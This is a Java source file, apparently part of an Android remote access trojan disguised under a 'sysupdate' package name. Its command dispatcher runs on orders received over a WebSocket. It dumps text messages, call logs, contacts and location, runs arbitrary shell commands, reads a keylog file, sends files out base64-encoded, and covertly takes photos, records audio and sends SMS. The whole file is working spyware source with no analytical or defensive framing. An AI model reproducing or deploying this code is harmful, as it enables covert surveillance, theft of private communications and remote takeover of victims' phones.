package com.sysupdate;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import okhttp3.WebSocket;

public class CommandHandler {

    public static JSONObject deviceInfo(Context ctx) {
        JSONObject o = new JSONObject();
        try {
            o.put("model", Build.MODEL);
            o.put("brand", Build.BRAND);
            o.put("android", Build.VERSION.RELEASE);
            o.put("sdk", Build.VERSION.SDK_INT);
            o.put("id", Build.ID);
            BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) {
                o.put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
            }
            try {
                TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) o.put("carrier", tm.getNetworkOperatorName());
            } catch (Exception ignored) {}
        } catch (Exception ignored) {}
        return o;
    }

    public static void dispatch(Context ctx, WebSocket ws, String cmd, String arg) {
        new Thread(() -> {
            try {
                switch (cmd) {
                    case "info":       send(ws, cmd, deviceInfo(ctx)); break;
                    case "sms":        send(ws, cmd, dumpSms(ctx)); break;
                    case "calls":      send(ws, cmd, dumpCalls(ctx)); break;
                    case "contacts":   send(ws, cmd, dumpContacts(ctx)); break;
                    case "location":   send(ws, cmd, getLocation(ctx)); break;
                    case "files":      send(ws, cmd, listDir(arg == null ? Environment.getExternalStorageDirectory().getAbsolutePath() : arg)); break;
                    case "shell":      send(ws, cmd, shell(arg)); break;
                    case "keylog":     send(ws, cmd, readKeylog(ctx)); break;
                    case "clipboard":  send(ws, cmd, "unsupported-in-bg"); break;
                    case "vibrate":    vibrate(ctx); send(ws, cmd, "ok"); break;
                    case "download":   exfiltrate(ws, arg); break;
                    case "photo":      photo(ctx, ws, arg == null ? "rear" : arg); break;
                    case "record":     record(ctx, ws, arg == null ? "10" : arg); break;
                    case "sms_send":   sendSms(arg); send(ws, cmd, "sent"); break;
                    default:           sendError(ws, "unknown cmd: " + cmd);
                }
            } catch (Exception e) {
                sendError(ws, e.toString());
            }
        }).start();
    }

    private static void send(WebSocket ws, String cmd, Object data) {
        try {
            JSONObject o = new JSONObject();
            o.put("type", "response");
            o.put("cmd", cmd);
            o.put("data", data);
            ws.send(o.toString());
        } catch (Exception e) { Log.e(RatService.TAG, "send", e); }
    }

    private static void sendError(WebSocket ws, String msg) {
        try {
            JSONObject o = new JSONObject();
            o.put("type", "error");
            o.put("data", msg);
            ws.send(o.toString());
        } catch (Exception ignored) {}
    }

    private static JSONArray dumpSms(Context ctx) {
        JSONArray arr = new JSONArray();
        if (ctx.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            return arr;
        Cursor c = ctx.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address", "body", "date"}, null, null, "date DESC");
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 500) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("from", c.getString(0));
                    o.put("body", c.getString(1));
                    o.put("date", c.getLong(2));
                    arr.put(o);
                } catch (Exception ignored) {}
            }
            c.close();
        }
        return arr;
    }

    private static JSONArray dumpCalls(Context ctx) {
        JSONArray arr = new JSONArray();
        if (ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            return arr;
        Cursor c = ctx.getContentResolver().query(
                android.provider.CallLog.Calls.CONTENT_URI,
                new String[]{"number", "type", "duration", "date"}, null, null, "date DESC");
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 500) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("number", c.getString(0));
                    o.put("type", c.getInt(1));
                    o.put("dur", c.getLong(2));
                    o.put("date", c.getLong(3));
                    arr.put(o);
                } catch (Exception ignored) {}
            }
            c.close();
        }
        return arr;
    }

    private static JSONArray dumpContacts(Context ctx) {
        JSONArray arr = new JSONArray();
        if (ctx.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            return arr;
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                }, null, null, null);
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 1000) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("name", c.getString(0));
                    o.put("number", c.getString(1));
                    arr.put(o);
                } catch (Exception ignored) {}
            }
            c.close();
        }
        return arr;
    }

    @SuppressLint("MissingPermission")
    private static JSONObject getLocation(Context ctx) {
        JSONObject o = new JSONObject();
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return o;
            Location best = null;
            for (String p : lm.getProviders(true)) {
                Location l = lm.getLastKnownLocation(p);
                if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
            }
            if (best != null) {
                o.put("lat", best.getLatitude());
                o.put("lon", best.getLongitude());
                o.put("acc", best.getAccuracy());
                o.put("provider", best.getProvider());
                o.put("time", best.getTime());
            } else {
                o.put("error", "no last-known fix");
            }
        } catch (Exception e) {
            try { o.put("error", e.toString()); } catch (Exception ignored) {}
        }
        return o;
    }

    private static JSONArray listDir(String path) {
        JSONArray arr = new JSONArray();
        try {
            File dir = new File(path);
            File[] files = dir.listFiles();
            if (files == null) return arr;
            for (File f : files) {
                JSONObject o = new JSONObject();
                o.put("name", f.getName());
                o.put("dir", f.isDirectory());
                o.put("size", f.length());
                o.put("path", f.getAbsolutePath());
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }

    private static String shell(String cmd) {
        if (cmd == null) return "no cmd";
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append('\n');
            p.waitFor();
            return sb.toString();
        } catch (Exception e) {
            return "err: " + e;
        }
    }

    private static String readKeylog(Context ctx) {
        try {
            File f = new File(ctx.getFilesDir(), "keylog.txt");
            if (!f.exists()) return "(empty)";
            FileInputStream in = new FileInputStream(f);
            byte[] b = new byte[(int) f.length()];
            in.read(b);
            in.close();
            return new String(b);
        } catch (Exception e) { return "err: " + e; }
    }

    private static void vibrate(Context ctx) {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(2000);
        } catch (Exception ignored) {}
    }

    private static void exfiltrate(WebSocket ws, String path) {
        try {
            File f = new File(path);
            if (!f.exists() || f.isDirectory()) {
                sendError(ws, "not a file: " + path);
                return;
            }
            FileInputStream in = new FileInputStream(f);
            byte[] data = new byte[(int) f.length()];
            in.read(data);
            in.close();

            JSONObject o = new JSONObject();
            o.put("type", "file");
            o.put("name", f.getName());
            o.put("data_b64", Base64.encodeToString(data, Base64.NO_WRAP));
            ws.send(o.toString());
        } catch (Exception e) {
            sendError(ws, "exfil: " + e);
        }
    }

    @SuppressLint("MissingPermission")
    private static void photo(Context ctx, WebSocket ws, String facing) {
        try {
            int camId = facing.equals("front") ? findCamera(Camera.CameraInfo.CAMERA_FACING_FRONT)
                                               : findCamera(Camera.CameraInfo.CAMERA_FACING_BACK);
            if (camId < 0) { sendError(ws, "no camera " + facing); return; }

            Camera cam = Camera.open(camId);
            Camera.Parameters p = cam.getParameters();
            p.setPictureFormat(ImageFormat.JPEG);
            p.setJpegQuality(85);
            cam.setParameters(p);

            cam.takePicture(null, null, (data, c) -> {
                try {
                    c.release();
                    JSONObject o = new JSONObject();
                    o.put("type", "file");
                    o.put("name", "photo_" + System.currentTimeMillis() + ".jpg");
                    o.put("data_b64", Base64.encodeToString(data, Base64.NO_WRAP));
                    ws.send(o.toString());
                } catch (Exception ignored) {}
            });
        } catch (Exception e) {
            sendError(ws, "photo: " + e);
        }
    }

    private static int findCamera(int facing) {
        Camera.CameraInfo info = new Camera.CameraInfo();
        for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
            Camera.getCameraInfo(i, info);
            if (info.facing == facing) return i;
        }
        return -1;
    }

    @SuppressLint("MissingPermission")
    private static void record(Context ctx, WebSocket ws, String secs) {
        try {
            int duration = Integer.parseInt(secs);
            File out = new File(ctx.getCacheDir(), "rec_" + System.currentTimeMillis() + ".m4a");
            MediaRecorder mr = new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mr.setOutputFile(out.getAbsolutePath());
            mr.prepare();
            mr.start();
            Thread.sleep(duration * 1000L);
            mr.stop();
            mr.release();
            exfiltrate(ws, out.getAbsolutePath());
        } catch (Exception e) {
            sendError(ws, "record: " + e);
        }
    }

    private static void sendSms(String arg) {
        try {
            if (arg == null || !arg.contains("|")) return;
            String[] parts = arg.split("\\|", 2);
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(parts[0], null, parts[1], null, null);
        } catch (Exception ignored) {}
    }
}